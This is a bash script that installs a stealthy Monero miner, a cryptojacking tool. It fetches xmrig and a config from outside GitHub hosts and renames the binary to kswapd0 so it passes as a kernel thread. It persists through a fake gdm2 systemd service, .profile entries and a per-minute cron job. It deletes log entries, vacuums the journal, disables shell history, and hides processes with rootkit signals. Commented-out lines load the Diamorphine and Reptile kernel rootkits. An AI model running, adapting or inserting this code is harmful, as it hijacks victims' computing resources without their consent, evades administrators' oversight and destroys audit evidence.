#!/bin/bash

# ==================== DISABLE ALL DEBUGGING ====================
{ set +x; } 2>/dev/null
unset BASH_XTRACEFD PS4 2>/dev/null
# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible

# Continue with existing code...
# Removed -u and -o pipefail to ensure script ALWAYS continues
set +ue          # Disable exit on error
set +o pipefail  # Disable pipeline error propagation
IFS=$'\n\t'

# Trap errors but continue execution
trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR

# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
force_stop_service() {
    local service_names="$1"
    local process_names="$2"
    local max_attempts=60
    local attempt=0
    
    echo "[*] Force-stopping services: $service_names"
    echo "[*] Force-stopping processes: $process_names"
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        
        # Try systemctl stop
        if [ -n "$service_names" ]; then
            for svc in $service_names; do
                if systemctl is-active --quiet "$svc" 2>/dev/null; then
                    echo "[*] Attempt $attempt: Stopping $svc..."
                    sudo systemctl stop "$svc" 2>/dev/null || true
                    sleep 1
                fi
            done
        fi
        
        # Try killall
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                if pgrep -x "$proc" >/dev/null 2>&1; then
                    echo "[*] Attempt $attempt: Killing $proc..."
                    killall "$proc" 2>/dev/null || true
                    sleep 1
                fi
            done
        fi
        
        # Force kill every 5th attempt
        if [ $((attempt % 5)) -eq 0 ]; then
            echo "[*] Attempt $attempt: Using SIGKILL..."
            if [ -n "$process_names" ]; then
                for proc in $process_names; do
                    killall -9 "$proc" 2>/dev/null || true
                done
            fi
            sleep 2
        fi
        
        # Check if stopped
        local still_running=false
        if [ -n "$service_names" ]; then
            for svc in $service_names; do
                if systemctl is-active --quiet "$svc" 2>/dev/null; then
                    still_running=true
                    break
                fi
            done
        fi
        
        if [ "$still_running" = false ] && [ -n "$process_names" ]; then
            for proc in $process_names; do
                if pgrep -f "$proc" >/dev/null 2>&1; then
                    still_running=true
                    break
                fi
            done
        fi
        
        if [ "$still_running" = false ]; then
            echo "[✓] All services/processes stopped!"
            return 0
        fi
        
        if [ $attempt -lt $max_attempts ]; then
            sleep 5
        fi
    done
    
    # Final nuclear kill
    echo "[!] Max attempts reached, final kill..."
    killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null || true
    return 0
}

# ==================== CLEAN PREVIOUS INSTALLATIONS ====================
echo "[*] Cleaning previous installations..."

# Use robust force-stop function
#force_stop_service \
#    "gdm2 swapd moneroocean_miner" \
#    "xmrig kswapd0 swapd gdm2 moneroocean_miner"

# Remove crontab entries
crontab -l | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab -

# Remove systemd services
sudo systemctl stop gdm2 swapd moneroocean_miner 2>/dev/null
sudo systemctl disable gdm2 swapd moneroocean_miner 2>/dev/null
sudo rm -f /etc/systemd/system/gdm2.service /etc/systemd/system/swapd.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
sudo systemctl daemon-reload 2>/dev/null

# Remove SysV init scripts
sudo rm -f /etc/init.d/gdm2 /etc/init.d/swapd /etc/init.d/moneroocean_miner 2>/dev/null

# Clean home directories
rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache /tmp/xmrig*

# Remove from profile
sed -i '/\.system_cache\|\.swapd\|\.gdm\|moneroocean/d' ~/.profile ~/.bashrc ~/.bash_profile 2>/dev/null

# Clean SSH keys if they exist
if [ -f ~/.ssh/authorized_keys ] && grep -q "AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh" ~/.ssh/authorized_keys; then
    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh/d' ~/.ssh/authorized_keys
fi

# Clean root directories (if running as root)
if [ "$(id -u)" -eq 0 ]; then
    rm -rf /root/.swapd /root/.gdm* /root/.system_cache /root/.ssh/authorized_keys_backdoor 2>/dev/null
    sed -i '/clamav-mail/d' /etc/passwd /etc/shadow /etc/sudoers.d/ 2>/dev/null
    userdel -r clamav-mail 2>/dev/null
    rm -f /etc/sudoers.d/clamav-mail 2>/dev/null
fi

# Remove kernel rootkits
sudo rmmod diamorphine reptile rootkit 2>/dev/null
sudo rm -rf /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null

# Clean logs
sudo sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
sudo journalctl --vacuum-time=1s 2>/dev/null

echo "[✓] Previous installations cleaned"
sleep 2
# ======================================================================

# Continue with original script...
unset HISTFILE
# ... rest of the script
#unset HISTFILE ;history -d $((HISTCMD-1))
#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))

crontab -r

#systemctl disable gdm2 --now
#systemctl disable swapd --now

#chattr -i $HOME/.gdm2/
#chattr -i $HOME/.swapd/

#killall swapd
#kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

killall kswapd0
kill -9 $(/bin/ps ax -fu $USER | grep "kswapd0" | grep -v "grep" | awk '{print $2}')

rm -rf $HOME/.system_cache/
#rm -rf $HOME/.swapd/

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=${2:-}  # Optional - use empty string if not provided (fixes "unbound variable" error with set -u)

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  # exit 1  # REMOVED - script continues on errors
fi

WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  # exit 1  # REMOVED - script continues on errors
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  # exit 1  # REMOVED - script continues on errors
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  # exit 1  # REMOVED - script continues on errors
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  # exit 1  # REMOVED - script continues on errors
fi

# ==================== LOW-RAM CHECK ====================
echo "[*] Checking system resources..."
TOTAL_RAM=$(free -m 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "0")
CURRENT_SWAP=$(free -m 2>/dev/null | awk '/^Swap:/ {print $2}' || echo "0")

echo "[*] System RAM: ${TOTAL_RAM}MB, Swap: ${CURRENT_SWAP}MB"

if [ "$TOTAL_RAM" -lt 2048 ] || [ "$CURRENT_SWAP" -eq 0 ]; then
    echo ""
    echo "WARNING: Low RAM detected!"
    echo "Your system has only ${TOTAL_RAM}MB RAM and ${CURRENT_SWAP}MB swap."
    echo "Miner may be killed by OOM (Out Of Memory) killer."
    echo ""
    echo "Recommended: Ask your system administrator to add swap space:"
    echo "  sudo fallocate -l 2G /swapfile"
    echo "  sudo chmod 600 /swapfile"
    echo "  sudo mkswap /swapfile"
    echo "  sudo swapon /swapfile"
    echo "  echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab"
    echo ""
    echo "Continuing installation with reduced CPU threads (50%)..."
    echo ""
    sleep 3
fi
# ==================== END LOW-RAM CHECK ====================

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  # exit 1  # REMOVED - script continues on errors
fi

power2() {
  if ! type bc >/dev/null; then
    if [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

PORT=$(($EXP_MONERO_HASHRATE * 30))
PORT=$(($PORT == 0 ? 1 : $PORT))
PORT=$(power2 $PORT)
PORT=$((10000 + $PORT))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  # exit 1  # REMOVED - script continues on errors
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  # exit 1  # REMOVED - script continues on errors
fi

# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.system_cache/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 3
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig
killall -9 kswapd0

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
rm -rf $HOME/.gdm2

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  # exit 1  # REMOVED - script continues on errors
fi

wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
#tar xzvf $HOME/.gdm2/xmrig.tar.gz
#gunzip -d $HOME/.gdm2/xmrig.tar.gz
#tar xf $HOME/.gdm2/xmrig.tar

echo "[*] Unpacking xmrig.tar.gz to $HOME/.system_cache/"
[ -d $HOME/.system_cache ] || mkdir $HOME/.system_cache/
if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.system_cache/; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.system_cache/ directory"
  # exit 1  # REMOVED - script continues on errors
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.system_cache/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
$HOME/.system_cache/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.system_cache/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.system_cache/xmrig is not functional"
  else
    echo "WARNING: Advanced version of $HOME/.system_cache/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"//g')
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" | cut -d \" -f2)

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    # exit 1  # REMOVED - script continues on errors
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.system_cache/"
  if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.system_cache/ --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.system_cache/ directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.system_cache/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
  $HOME/.system_cache/xmrig --help >/dev/null
  if (test $? -ne 0); then
    if [ -f $HOME/.system_cache/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.system_cache/xmrig is not functional too"
    else
      echo "ERROR: Stock version of $HOME/.system_cache/xmrig was removed by antivirus too"
    fi
    # exit 1  # REMOVED - script continues on errors
  fi
fi

echo "[*] Miner $HOME/.system_cache/xmrig is OK"

mv $HOME/.system_cache/xmrig $HOME/.system_cache/kswapd0

rm -rf $HOME/.system_cache/config.json
wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.system_cache/config.json
curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.system_cache/config.json

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=$(sh -c "(curl -4 ip.sb)")
if [ "$PASS" == "localhost" ]; then
  PASS=$(ip route get 1 | awk '{print $NF;exit}')
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json

# preparing script

echo "[*] Creating $HOME/.system_cache/miner.sh script"
cat >$HOME/.system_cache/miner.sh <<EOL
#!/bin/bash
if ! pidof kswapd0 >/dev/null; then
  nice $HOME/.system_cache/kswapd0 \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.system_cache/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .system_cache/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.system_cache/gdm2.rc script to $HOME/.profile"
    echo "$HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else
    echo "Looks like $HOME/.system_cache/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
  /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.system_cache/kswapd0.log file)"
    /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating moneroocean systemd service"
    cat >/tmp/gdm2.service <<EOL
[Unit]
Description=GDM2
After=network.target

[Service]
Type=simple
ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json
Restart=always
RestartSec=10
TimeoutStartSec=30

# Resource management
Nice=10
CPUWeight=1

# OOM protection (lower = less likely to be killed)
OOMScoreAdjust=200

# Memory limits for low-RAM systems
MemoryMax=400M
MemoryHigh=300M

# Enable logging for debugging
StandardOutput=journal
StandardError=journal
SyslogIdentifier=gdm2

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/gdm2.service /etc/systemd/system/gdm2.service
    
    echo "[*] Ensuring old processes are stopped before starting new service..."
    force_stop_service "swapd"
    
    echo "[*] Reloading systemd daemon..."
    sudo systemctl daemon-reload
    
    echo "[*] Enabling gdm2 service for auto-start..."
    sudo systemctl enable gdm2.service
    
    echo "[*] Starting gdm2 service NOW..."
    sudo systemctl start gdm2.service
    
    # Wait for service to start
    sleep 3
    
    # Verify service is running
    echo "[*] Verifying service status..."
    if sudo systemctl is-active --quiet gdm2.service; then
        echo "[✓] Service is RUNNING!"
        sudo systemctl status gdm2.service --no-pager -l | head -15
    else
        echo "[!] WARNING: Service is NOT running!"
        echo "[!] Checking logs..."
        sudo journalctl -u gdm2 -n 20 --no-pager
        echo ""
        echo "[!] Trying to start again..."
        sudo systemctl start gdm2.service
        sleep 2
        if sudo systemctl is-active --quiet gdm2.service; then
            echo "[✓] Service started on second attempt!"
        else
            echo "[!] Service failed to start - check logs with:"
            echo "    sudo journalctl -u gdm2 -f"
            echo "    sudo systemctl status gdm2"
        fi
    fi
    
    echo ""
    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
  if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.system_cache/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.system_cache/config_background.json"
fi
echo ""

# Original config modifications
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.system_cache/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.system_cache/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json

cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json

# ==================== ENABLE HIDDEN XMRIG LOGGING ====================
echo "[*] Setting up hidden miner logging..."

# Create hidden log directory
mkdir -p "$HOME/.system_cache/.syslogs"

# Enable hidden log file (disguised as system cache)
sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config.json
sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config_background.json

# Set verbose logging level for mining output
sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config.json
sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config_background.json

# Keep syslog disabled for stealth
sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config_background.json

# Rotate logs to keep them small (daily rotation)
sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config.json
sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config_background.json

echo "[✓] Hidden miner logging enabled: $HOME/.system_cache/.syslogs/.system-cache.tmp"
echo "[*] To view mining logs: cat $HOME/.system_cache/.syslogs/.system-cache.tmp"
# =====================================================================
# ==============================================================

# Continue with existing script...
#cat $HOME/.system_cache/config.json

# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json" &
else
    echo "kswapd0 is already running."
fi

echo "[*] Create the check script"
cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
#!/bin/bash
lockfile="$HOME/.system_cache/check_and_start.lock"
# Locking-Mechanismus mit flock
exec 200>"$lockfile"
flock -n 200 || exit 1
if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
  "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json"
fi
EOF

echo "[*] Make the check script executable"
chmod +x "$HOME/.system_cache/check_and_start.sh"

echo "[*] Nur einen Cronjob hinzufügen, falls nicht vorhanden"
(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -


#    echo "[*] make toolZ, Diamorphine"
#          cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get reinstall kmod ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
    
#    echo "[*] Reptile..."
#        cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
    
#    echo "[*] hide crypto miner."
#        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/


# ==================== FIX: Safe process hiding ====================
# Only execute kill commands if PIDs are valid numbers
MINER_PID=$(pgrep -f -u root config.json 2>/dev/null | head -1)
if [ -n "$MINER_PID" ] && [[ "$MINER_PID" =~ ^[0-9]+$ ]]; then
    kill -31 "$MINER_PID" 2>/dev/null || true
fi

SWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}')
for pid in $SWAPD_PIDS; do
    if [[ "$pid" =~ ^[0-9]+$ ]]; then
        kill -31 "$pid" 2>/dev/null || true
    fi
done

KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
for pid in $KSWAPD_PIDS; do
    if [[ "$pid" =~ ^[0-9]+$ ]]; then
        kill -31 "$pid" 2>/dev/null || true
    fi
done

